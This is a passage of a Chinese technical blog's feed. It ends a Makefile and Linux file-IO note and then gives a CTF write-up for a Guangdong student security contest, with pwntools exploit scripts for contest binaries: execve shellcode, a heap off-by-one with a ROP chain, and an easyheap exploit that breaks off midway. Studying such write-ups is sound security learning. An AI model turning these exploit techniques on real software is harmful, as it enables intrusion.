class="hljs-section">sub.o:sub.c</span><br>gcc -c sub.c<br><span class="hljs-section">mult.o:mult.c</span><br>gcc -c mult.c<br><span class="hljs-section">main.o:main.c</span><br>gcc -c main.c<br><br><span class="hljs-comment"># %.o:%.c\</span><br>- %: 通配符，匹配一个字符串\<br>- 两个%匹配的是同一个字符串\<br><br><span class="hljs-section">%.o:%.c</span><br>gcc -c <span class="hljs-variable">$&lt;</span> -o <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li><p>$(wildcard PATTERN…) </p><ul><li><p>功能：获取指定目录下指定类型的文件列表 </p></li><li><p>参数：PATTERN 指的是某个或多个目录下的对应的某种类型的文件，如果有多个目录，一般使用空格间隔 </p></li><li><p>返回：得到的若干个文件的文件列表，文件名之间使用空格间隔 </p></li><li><p>示例： </p><p>​    $(wildcard <em>.c ./sub/</em>.c) </p><p>​    返回值格式: a.c b.c c.c d.c e.c f.c</p></li></ul></li><li><p>$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;) </p><ul><li><p>功能：查找中&lt;text&gt;的单词(单词以空格”、“Tab”或“回车”“换行”分隔)是否符合&lt;pattern&gt;模式，如果匹配的话，则以&lt;replacement&gt;替换。 </p></li><li><p>&lt;pattern&gt;可以包括通配符<code>%</code>，表示任意长度的字串。如果&lt;replacement&gt;中也包含<code>%</code>，那么，&lt;replacement&gt;中的这个<code>%</code>将是&lt;pattern&gt;中的那个%所代表的字串。(可以用<code>\</code>来转义，以<code>\%</code>来表示真实含义的<code>%</code>字符) </p></li><li><p>返回：函数返回被替换过后的字符串 </p></li><li><p>示例： </p><p>  $(patsubst %.c, %.o, x.c bar.c) </p><p>  返回值格式: x.o bar.o</p></li></ul></li></ul><h2 id="文件IO"><a href="#文件IO" class="headerlink" title="文件IO"></a>文件IO</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Linux系统IO函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">int</span> flags)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">mode_t</span> mode)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">off_t</span> <span class="hljs-title">lseek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> offset, <span class="hljs-keyword">int</span> whence)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">stat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, struct stat *statbuf)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">lstat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, struct stat *statbuf)</span></span>;<br><br><span class="hljs-comment">// stat结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> &#123;</span><br>    <span class="hljs-keyword">dev_t</span> st_dev; <span class="hljs-comment">// 文件的设备编号</span><br>    <span class="hljs-keyword">ino_t</span> st_ino; <span class="hljs-comment">// 节点</span><br>    <span class="hljs-keyword">mode_t</span> st_mode; <span class="hljs-comment">// 文件的类型和存取的权限</span><br>    <span class="hljs-keyword">nlink_t</span> st_nlink; <span class="hljs-comment">// 连到该文件的硬连接数目</span><br>    <span class="hljs-keyword">uid_t</span> st_uid; <span class="hljs-comment">// 用户ID</span><br>    <span class="hljs-keyword">gid_t</span> st_gid; <span class="hljs-comment">// 组ID</span><br>    <span class="hljs-keyword">dev_t</span> st_rdev; <span class="hljs-comment">// 设备文件的设备编号</span><br>    <span class="hljs-keyword">off_t</span> st_size; <span class="hljs-comment">// 文件字节数(文件大小)</span><br>    <span class="hljs-keyword">blksize_t</span> st_blksize; <span class="hljs-comment">// 块大小</span><br>    <span class="hljs-keyword">blkcnt_t</span> st_blocks; <span class="hljs-comment">// 块数</span><br>    <span class="hljs-keyword">time_t</span> st_atime; <span class="hljs-comment">// 最后一次访问时间</span><br>    <span class="hljs-keyword">time_t</span> st_mtime; <span class="hljs-comment">// 最后一次修改时间</span><br>    <span class="hljs-keyword">time_t</span> st_ctime; <span class="hljs-comment">// 最后一次改变时间(指属性)</span><br>&#125;;<br><br><span class="hljs-comment">// 文件属性操作函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">access</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">int</span> mode)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chmod</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">int</span> mode)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chown</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uid_t</span> owner, <span class="hljs-keyword">gid_t</span> group)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">truncate</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">off_t</span> length)</span></span>;<br><br><span class="hljs-comment">// 目录操作函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rename</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *oldpath, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *newpath)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">getcwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">mode_t</span> mode)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rmdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname)</span></span>;<br><br><span class="hljs-comment">// dirent 结构体和 d_type</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// 此目录进入点的inode</span><br>    <span class="hljs-keyword">ino_t</span> d_ino; <br>    <span class="hljs-comment">// 目录文件开头至此目录进入点的位移</span><br>    <span class="hljs-keyword">off_t</span> d_off; <br>    <span class="hljs-comment">// d_name 的长度, 不包含NULL字符</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> d_reclen; <br>    <span class="hljs-comment">// d_name 所指的文件类型</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> d_type; <br>    <span class="hljs-comment">// 文件名</span><br>    <span class="hljs-keyword">char</span> d_name[<span class="hljs-number">256</span>];<br>&#125;;<br><br><span class="hljs-comment">// 目录遍历函数</span><br><span class="hljs-function">DIR *<span class="hljs-title">opendir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name)</span></span>;<br><span class="hljs-function">struct dirent *<span class="hljs-title">readdir</span><span class="hljs-params">(DIR *dirp)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">closedir</span><span class="hljs-params">(DIR *dirp)</span></span>;<br><br><span class="hljs-comment">// dup、dup2函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> oldfd)</span></span>;<span class="hljs-comment">// 复制文件描述符</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> oldfd, <span class="hljs-keyword">int</span> newfd)</span></span>;<span class="hljs-comment">// 重定向文件描述符</span><br><br><span class="hljs-comment">// fcntl函数 复制文件描述符，设置/获取文件的状态标志</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fcntl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> cmd, ... <span class="hljs-comment">/* arg */</span> )</span></span>;<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.nowcoder.com/study/live/504">https://www.nowcoder.com/study/live/504</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第二届广东大学生网络安全大赛</title>
    <link href="/2022/05/25/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <url>/2022/05/25/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>替补参赛，只做出两道pwn。</p><p>题目连接：<a href="https://pan.baidu.com/s/1w2_DnoXSwgIzHLqlIcB4Cw">https://pan.baidu.com/s/1w2_DnoXSwgIzHLqlIcB4Cw</a><br>提取码：jkg0 </p><p><img src="https://s2.loli.net/2022/05/25/NDnwiIXGMk4OQm1.png" alt="image-20220525123229430"></p><h2 id="jmp-rsp"><a href="#jmp-rsp" class="headerlink" title="jmp_rsp"></a>jmp_rsp</h2><p>签到题，直接找到jmp rsp的gadget地址，然后写shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./jmp_rsp&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(binary)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;47.106.122.102&#x27;</span>,  <span class="hljs-number">44300</span>)<br>    <span class="hljs-comment"># libc = ELF(&#x27; &#x27;)</span><br>elf = ELF(binary)<br><br><br><span class="hljs-comment"># gdb.attach(p)</span><br>jmp_rsp = <span class="hljs-number">0x46d01d</span><br>shellcode = <span class="hljs-string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x88</span> + p64(jmp_rsp) + shellcode<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="midpwn"><a href="#midpwn" class="headerlink" title="midpwn"></a>midpwn</h2><p>libc2.31的off by one，限制堆块只能0x28和0xb0，同时开了白名单，导致无法直接跳转setcontext那个gadget了，可以用下面这段gadget控制rdx然后再跳到setcontext，剩下都是常规思路了。比赛时没看题目描述，文件描述符1-5都被用了，打本地文件描述符用3，远程换成6。</p><p><code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></p><p><img src="https://s2.loli.net/2022/05/25/qbcrLv2R4pPQK6Y.png" alt="image-20220525124129341"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./orz&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;120.79.220.233&#x27;</span>, <span class="hljs-number">45219</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;one?&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;size : &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendafter(<span class="hljs-string">&#x27;your note.&#x27;</span>, content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;one?&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;index.&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;new note.&#x27;</span>, content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;one?&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;index.&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;one?&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;index.&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>free(i)<br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<span class="hljs-comment">#2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + <span class="hljs-string">&#x27;\xc1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;flag\x00&#x27;</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">2</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#13</span><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;222&#x27;</span>)<span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;333&#x27;</span>)<span class="hljs-comment">#15</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-comment">#16</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-comment">#17</span><br>show(<span class="hljs-number">16</span>)<br>p.recvline()<br>heap_base = (u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span>) - <span class="hljs-number">0x2000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">15</span>, p64(free_hook) + <span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>, p64(libc_base + <span class="hljs-number">0x1518b0</span>))<br>pop_rdi = <span class="hljs-number">0x23b72</span> + libc_base           <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi = <span class="hljs-number">0x2604f</span> + libc_base           <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx_r12 = <span class="hljs-number">0x119241</span> + libc_base      <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br>ret = <span class="hljs-number">0x22679</span> + libc_base               <span class="hljs-comment"># ret</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x47400</span><br>rdi_rdx = libc_base + <span class="hljs-number">0x1518b0</span><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>syscall = libc_base + <span class="hljs-number">0x10E000</span><br><br><span class="hljs-comment">#open</span><br>payload = p64(pop_rdi) + p64(heap_base+<span class="hljs-number">0x2d50</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br><span class="hljs-comment">#read</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_base+<span class="hljs-number">0x2b0</span>) <br>payload += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>) + p64(libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br><br><span class="hljs-comment"># write</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br><br><br>edit(<span class="hljs-number">17</span>, payload + <span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>edit(<span class="hljs-number">0</span>, p64(heap_base + <span class="hljs-number">0x2c60</span>)*<span class="hljs-number">5</span> + <span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>edit(<span class="hljs-number">16</span>, ((p64(heap_base + <span class="hljs-number">0x2c60</span>)+p64(heap_base + <span class="hljs-number">0x2c60</span>)).ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(setcontext+<span class="hljs-number">33</span>)).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(heap_base+<span class="hljs-number">0x2ba0</span>) + p64(ret) + <span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">16</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>比赛时看了挺久没思路，赛后根据ex师傅思路复现，利用流程如下：</p><p>爆破程序基址和堆基址之间的偏移，把编辑次数和后门写入次数的变量改大，申请个大堆块，得到libc附近的地址，然后就利用偏移差打stdout泄露libc，泄露栈地址，最后打栈溢出</p><h3 id="本地调试exp"><a href="#本地调试exp" class="headerlink" title="本地调试exp"></a>本地调试exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;4.delete\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx?&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;Context:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params">size, offset, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;4.delete\n&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&#x27;Offset?\n&#x27;</span>, <span class="hljs-built_in">str</span>(offset))<br>p.sendafter(<span class="hljs-string">&#x27;Context:\n&#x27;</span>, content)<br><br>gdb.attach(p)<br><br>distance = <span class="hljs-number">0x5000</span><br><span class="hljs-comment"># 修改 backdoor_time -&gt; 0x100</span><br>backdoor(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x4014</span>-<span class="hljs-number">0x8f0</span>-<span class="hljs-number">0x5000</span>, p16(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># 修改 edit_time -&gt; 0x100</span><br>backdoor(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x4010</span>-<span class="hljs-number">0xa00</span>-<span 